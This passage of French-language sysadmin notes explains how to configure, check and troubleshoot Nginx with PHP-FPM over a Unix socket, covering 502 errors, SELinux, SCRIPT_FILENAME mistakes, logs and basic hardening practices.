```bash
# Activer + démarrer
sudo systemctl enable --now nginx
sudo systemctl enable --now php-fpm

# Vérifier status
sudo systemctl status nginx
sudo systemctl status php-fpm
```

**Vérifier socket créé** :
```bash
# Socket existe
ls -l /run/php-fpm/www.sock

# PHP-FPM écoute
sudo ss -xl | grep php-fpm
# u_str  LISTEN  /run/php-fpm/www.sock
```

---

### Troubleshooting

**502 Bad Gateway** :

**Cause 1** : PHP-FPM pas démarré.
```bash
sudo systemctl status php-fpm
sudo systemctl start php-fpm
```

**Cause 2** : Socket path incorrect.
```bash
# Nginx config
grep fastcgi_pass /etc/nginx/conf.d/*.conf
# fastcgi_pass unix:/run/php-fpm/www.sock;

# PHP-FPM config
grep listen /etc/php-fpm.d/www.conf
# listen = /run/php-fpm/www.sock

# Doivent matcher !
```

**Cause 3** : Permissions socket.
```bash
# Test accès socket
sudo -u nginx test -r /run/php-fpm/www.sock && echo "OK"
# OK

# Fix permissions
sudo chown nginx:nginx /run/php-fpm/www.sock
sudo chmod 660 /run/php-fpm/www.sock
```

**Cause 4** : SELinux.
```bash
# Logs SELinux
sudo tail -f /var/log/audit/audit.log | grep AVC

# Autoriser connexion
sudo setsebool -P httpd_can_network_connect 1
```

---

**PHP code displayed (not executed)** :

**Cause** : `location ~ \.php$` absent ou incorrect.
```bash
# Vérifier config Nginx
nginx -T | grep "\.php"
```

**Fix** :
```nginx
location ~ \.php$ {
    try_files $uri =404;
    fastcgi_pass unix:/run/php-fpm/www.sock;
    fastcgi_index index.php;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include fastcgi_params;
}
```

---

**File not found** :

**Cause** : `SCRIPT_FILENAME` incorrect.
```nginx
# ❌ Incorrect
fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name;

# ✅ Correct
fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
```

**Logs** :
```bash
# Nginx error log
sudo tail -f /var/log/nginx/error.log

# PHP-FPM error log
sudo tail -f /var/log/php-fpm/error.log
```

---

### Bonnes pratiques

**Performance** :
- Préférer Unix socket si Nginx + PHP-FPM même serveur
- TCP socket si PHP-FPM distribué (load balancing)

**Sécurité** :
- `try_files $uri =404` : Éviter exécution fichiers uploadés
- Socket permissions `0660` : Accès Nginx uniquement
- User/Group identiques PHP-FPM et Nginx

**Debugging** :
```bash
# Test PHP-FPM directly
SCRIPT_FILENAME=/var/www/html/index.php \
REQUEST_METHOD=GET \
cgi-fcgi -bind -connect /run/php-fpm/www.sock
```

---

*Notes évolutives - Compléter au fur et à mesure*


